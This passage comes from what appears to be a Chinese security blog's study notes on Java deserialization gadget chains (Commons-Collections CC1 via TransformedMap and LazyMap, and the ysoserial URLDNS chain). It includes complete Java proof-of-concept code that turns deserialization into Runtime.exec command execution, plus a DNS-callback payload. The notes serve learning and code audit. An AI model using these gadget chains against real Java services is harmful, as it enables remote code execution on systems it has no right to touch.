title="InvokerTransformer"></a>InvokerTransformer</h3><p>这个类可以用来执行任意方法，也是反序列化能执行任意代码的关键</p><p>构造函数，公有的构造啊函数需要三个参数第一是待执行的方法名，第二个参数是函数的参数列表的参数类型，第三个参数就是传递给函数的参数列表。</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105214619152.png" alt="image-20211105214619152"></p><p>利用反射调用函数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105214940329.png" alt="image-20211105214940329"></p><p>测试类</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105220944207.png" alt="image-20211105220944207"></p><h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h3><p>根据名字来看就是将多个<code>Transformer</code>依次调用各自的<code>transform</code>连接起来</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105231814199.png" alt="image-20211105231814199"></p><p>构造函数，需要传入一个<code>Transformer</code>类的数组对象</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105222243124.png" alt="image-20211105222243124"></p><p>测试代码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105230953256.png" alt="image-20211105230953256"></p><h2 id="TransformedMap-POC"><a href="#TransformedMap-POC" class="headerlink" title="TransformedMap POC"></a>TransformedMap POC</h2><p>对于<code>TransformerMap</code>反序列化时如果需要执行命令，必须调用到<code>put()</code>函数</p><p>主要利用得类是<code>AnnotationInvocationHandler</code>，它是在 <code>sun.reflect.annotation.AnnotationInvocationHandler</code>位置。按照之前的分析，如果要构造利用反序列化链就必须在有重写<code>readObject()</code>并且里面有对<code>Map</code>对象的增加操作</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211106002037911.png" alt="image-20211106002037911"></p><p>在重写的<code>readObject()</code>中最后一行中的<code>setValue()</code>就刚好可以触发整个链子，所以这样就构成了漏洞。</p><blockquote><p>注意里面的if判断语句</p></blockquote><p>POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, ClassNotFoundException, IOException, InvocationTargetException </span>&#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;gnome-calculator&quot;</span>&#125;)<br>        &#125;;<br>        Map inermap = <span class="hljs-keyword">new</span> HashMap();<br>        inermap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br>        Transformer transformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map outermap = TransformedMap.decorate(inermap, <span class="hljs-keyword">null</span>,transformer);<br><br>        Class clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);<br>        construct.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object obj = construct.newInstance(Retention.class, outermap);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(obj);<br>        objectOutputStream.close();<br><br>        System.out.println(byteArrayOutputStream);<br>        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray()));<br>        Object o = (Object) objectInputStream.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>执行效果如下</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211107022124421.png" alt="image-20211107022124421"></p><p>这个 POC 中需要注意的点</p><ol><li><code>Runtime</code>类是不能反序列化的，因为它没有扩展反序列化接口，所以需要使用反射来调用执行</li><li>需要注意构造 payload 时还需要注意 <code>inermap.put(&quot;value&quot;, &quot;lcdm123&quot;)</code></li><li>这个只对java的低版本（Java 8u71以前）适用，因为高版本对这个类的<code>readObject()</code>方法做了修改</li></ol><blockquote><p>具体的下面P神代码审计中都讲到了原因，所以就不重复记录浪费时间了</p></blockquote><p>但是在 ysoserial 中的链不是利用的 TransformedMap ，而是利用的 LazyMap，这是为什么呢？</p><p>为什么要先 inermap.put(“value”,”lcdm123”) 呢?</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;<br>        <span class="hljs-keyword">this</span>.type = var1;<br>        <span class="hljs-keyword">this</span>.memberValues = var2;<br>    &#125;<br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream var1)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        var1.defaultReadObject();<br>        AnnotationType var2 = <span class="hljs-keyword">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            var2 = AnnotationType.getInstance(<span class="hljs-keyword">this</span>.type);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalArgumentException var9) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>        &#125;<br><br>        Map var3 = var2.memberTypes();<br>        Iterator var4 = <span class="hljs-keyword">this</span>.memberValues.entrySet().iterator();<br><br>        <span class="hljs-keyword">while</span>(var4.hasNext()) &#123;<br>            Entry var5 = (Entry)var4.next();<br>            String var6 = (String)var5.getKey();<br>            Class var7 = (Class)var3.get(var6);<br>            <span class="hljs-keyword">if</span> (var7 != <span class="hljs-keyword">null</span>) &#123;<br>                Object var8 = var5.getValue();<br>                <span class="hljs-keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    var5.setValue((<span class="hljs-keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="hljs-string">&quot;[&quot;</span> + var8 + <span class="hljs-string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));<br>                &#125;<br>            &#125;<br>        &#125;<br><br>    &#125;<br></code></pre></td></tr></table></figure><p>这里我们可以倒着看，要执行到最后的setValue()必须 var7!= null，var7 的来源就是var3.get(var6)，<code>var3 = var2.memberTypes()</code>， <code>var2 = AnnotationType.getInstance(this.type)</code>，</p><p>var6 就是获取到 HashMap 的 key 值。</p><p>追踪一下 var2,会获取我们注解的基本信息(Target)，this.type为之前我们传入的注解</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211125162017969.png" alt="image-20211125162017969"></p><p>var3会获取var2中的Membertypes中的数值，即<code>&#123;value=class [Ljava.lang.annotation.ElementType;&#125;</code></p><ol><li>传入的注解需要存在memberTypes(即要存在注解元素名)</li></ol><blockquote><p>对于注解还需要单独去学习一下，这里还不是理解后的一点</p></blockquote><h2 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h2><p>LazyMap 和 TransformedMap 类似，都来自于 Common-Collections 库，并且继承了 AbstractMapDecorator。</p><p>LazyMap 和 TransformedMap 的唯一差别就是，TransformedMap 是写入元素时执行 transform 而 LazyMap 是在使用 get 方法中执行 factory.transform。LazyMap 的作用就是懒加载，在 get 不到值的时候，它会调用 factory.transform 方法去获取一个值</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211107142042883.png" alt="image-20211107142042883"></p><p>同样是利用到了AnnotationInvocationHandler类，但是它的 readObject() 方法中没有利用到 get 方法，但是在它的 invoke 方法中调用了 get，所以在 ysoserial 中利用了对象代理的方法调用到 invoke。</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211107150456447.png" alt="image-20211107150456447"></p><p>动态代理之前的学习笔记：<a href="http://lcdm123.xyz/2021/10/19/Java%E4%BB%A3%E7%90%86/">http://lcdm123.xyz/2021/10/19/Java%E4%BB%A3%E7%90%86/</a></p><p>这里先写了一个 Map 的代理类，这个代理类实现的 invoke 方法中检测到如果调用 get 方法就会执行自定义的内容。</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211107154521318.png" alt="image-20211107154521318"></p><p>通过这样的方法就可以调用到 invoke 方法中的get()方法。</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211107155236632.png" alt="image-20211107155236632"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1LazyMap</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;gnome-calculator&quot;</span>&#125;)<br>        &#125;;<br><br>        Map inermap = <span class="hljs-keyword">new</span> HashMap();<br>        Transformer transformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map outermap = LazyMap.decorate(inermap, transformer);<br><br>        Class clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor cons = clazz.getDeclaredConstructor(Class.class, Map.class);<br>        cons.setAccessible(<span class="hljs-keyword">true</span>);<br>        InvocationHandler handler = (InvocationHandler) cons.newInstance(Retention.class, outermap);<br><br>        Map proxymap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),<br>                <span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;,<br>                handler);<br>        handler = (InvocationHandler) cons.newInstance(Retention.class, proxymap);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(handler);<br>        objectOutputStream.close();<br><br>        System.out.println(byteArrayOutputStream);<br>        ObjectInputStream objectInputStream =  <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray()));<br>        Object o = (Object) objectInputStream.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这个POC和上面的差比不大，只是改动了一些地方，并且使用了 java 的代理机制触发了整条链子</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211107163204792.png" alt="image-20211107163204792"></p><p>这里的重点还是对于 java 代理机制的熟练理解与使用</p><p>参考文章</p><p><a href="http://diego.team/2021/02/04/java-cc1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">http://diego.team/2021/02/04/java-cc1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/</a></p><p><a href="https://y4tacker.blog.csdn.net/article/details/117279811">https://y4tacker.blog.csdn.net/article/details/117279811</a></p><p><a href="https://ego00.blog.csdn.net/article/details/119701408">https://ego00.blog.csdn.net/article/details/119701408</a></p><p>p神代码审计</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CC1&quot;&gt;&lt;a href=&quot;#CC1&quot; class=&quot;headerlink&quot; title=&quot;CC1&quot;&gt;&lt;/a&gt;CC1&lt;/h1&gt;&lt;h2 id=&quot;环境配置&quot;&gt;&lt;a href=&quot;#环境配置&quot; class=&quot;headerlink&quot; title=&quot;环境配置&quot;&gt;&lt;/a&gt;环境配</summary>
      
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java URLDNS反序列化链</title>
    <link href="http://example.com/2021/11/08/Java-URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/"/>
    <id>http://example.com/2021/11/08/Java-URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/</id>
    <published>2021-11-08T00:49:09.000Z</published>
    <updated>2021-11-10T00:50:27.459Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Ysoserial-URLDNS链分析"><a href="#Ysoserial-URLDNS链分析" class="headerlink" title="Ysoserial URLDNS链分析"></a>Ysoserial URLDNS链分析</h1><p>Java 反序列化三要素: readObject()反序列化利用点 + 反序列化链 + RCE触发点</p><h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>ysoserial 中的 URLDNS 链 </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211103132646400.png" alt="image-20211103132646400"></p><p>配置运行一下程序</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211103190638779.png" alt="image-20211103190638779"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211103190728640.png" alt="image-20211103190728640"></p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>这里是另外一个师傅写的测试代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">URLDNS</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-comment">//0x01.生成payload</span><br>        <span class="hljs-comment">//设置一个hashMap</span><br>        HashMap&lt;URL, String&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;URL, String&gt;();<br>        <span class="hljs-comment">//设置我们可以接受DNS查询的地址http://</span><br>        URL url = <span class="hljs-keyword">new</span> URL(<span class="hljs-string">&quot;http://qu7ljs.dnslog.cn&quot;</span>);<br>        <span class="hljs-comment">//将URL的hashCode字段设置为允许修改</span><br>        Field f = Class.forName(<span class="hljs-string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        f.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-comment">//**以下的蜜汁操作是为了不在put中触发URLDNS查询，如果不这么写就会触发两次（之后会解释）**</span><br>        <span class="hljs-comment">//1. 设置url的hashCode字段为0xdeadbeef（随意的值）</span><br>        f.set(url, <span class="hljs-number">0xdeadbeef</span>);<br>        <span class="hljs-comment">//2. 将url放入hashMap中，右边参数随便写</span><br>        hashMap.put(url, <span class="hljs-string">&quot;rmb122&quot;</span>);<br>        <span class="hljs-comment">//修改url的hashCode字段为-1，为了触发DNS查询（之后会解释）</span><br>        f.set(url, -<span class="hljs-number">1</span>);<br>        <span class="hljs-comment">//0x02.写入文件模拟网络传输</span><br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;out.ser&quot;</span>));<br>        oos.writeObject(hashMap);<br>        <span class="hljs-comment">//0x03.读取文件，进行反序列化触发payload</span><br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;out.ser&quot;</span>));<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211103223717961.png" alt="image-20211103223717961"></p><p>先对测试代码就行简单的理解，首先是定义了一个 <code>HashMap</code> 对象，键值分别为 <code>URL</code> 和 <code>String</code>，之后利用了反射原理获取到了权限去修改 <code>URL</code> 对象的私有成员变量 <code>HashCode</code> 值（<code>HashCode</code> 的默认值是 -1），分别更改了两次值，最后执行了一下序列化与反序列化操作。</p><p>Java 反序列化的漏洞点应该是重写后的 <code>readObject()</code> 方法所以看看序列化<code>HashMap</code>类的 <code>readObject()</code> 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span></span><br><span class="hljs-function">    <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>    <span class="hljs-comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span><br>    s.defaultReadObject();<br>    reinitialize();<br>    <span class="hljs-keyword">if</span> (loadFactor &lt;= <span class="hljs-number">0</span> || Float.isNaN(loadFactor))<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InvalidObjectException(<span class="hljs-string">&quot;Illegal load factor: &quot;</span> +<br>                                         loadFactor);<br>    s.readInt();                <span class="hljs-comment">// Read and ignore number of buckets</span><br>    <span class="hljs-keyword">int</span> mappings = s.readInt(); <span class="hljs-comment">// Read number of mappings (size)</span><br>    <span class="hljs-keyword">if</span> (mappings &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InvalidObjectException(<span class="hljs-string">&quot;Illegal mappings count: &quot;</span> +<br>                                         mappings);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mappings &gt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// (if zero, use defaults)</span><br>        <span class="hljs-comment">// Size the table using given load factor only if within</span><br>        <span class="hljs-comment">// range of 0.25...4.0</span><br>        <span class="hljs-keyword">float</span> lf = Math.min(Math.max(<span class="hljs-number">0.25f</span>, loadFactor), <span class="hljs-number">4.0f</span>);<br>        <span class="hljs-keyword">float</span> fc = (<span class="hljs-keyword">float</span>)mappings / lf + <span class="hljs-number">1.0f</span>;<br>        <span class="hljs-keyword">int</span> cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?<br>                   DEFAULT_INITIAL_CAPACITY :<br>                   (fc &gt;= MAXIMUM_CAPACITY) ?<br>                   MAXIMUM_CAPACITY :<br>                   tableSizeFor((<span class="hljs-keyword">int</span>)fc));<br>        <span class="hljs-keyword">float</span> ft = (<span class="hljs-keyword">float</span>)cap * lf;<br>        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?<br>                     (<span class="hljs-keyword">int</span>)ft : Integer.MAX_VALUE);<br><br>        <span class="hljs-comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span><br>        <span class="hljs-comment">// what we&#x27;re actually creating.</span><br>        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);<br>        <span class="hljs-meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br>        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="hljs-keyword">new</span> Node[cap];<br>        table = tab;<br><br>        <span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                K key = (K) s.readObject();<br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                V value = (V) s.readObject();<br>            putVal(hash(key), key, value, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">false</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211103233814772.png" alt="image-20211103233814772"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211103233852218.png" alt="image-20211103233852218"></p><blockquote><p>上面的 key 就是 URL类</p></blockquote><p><img 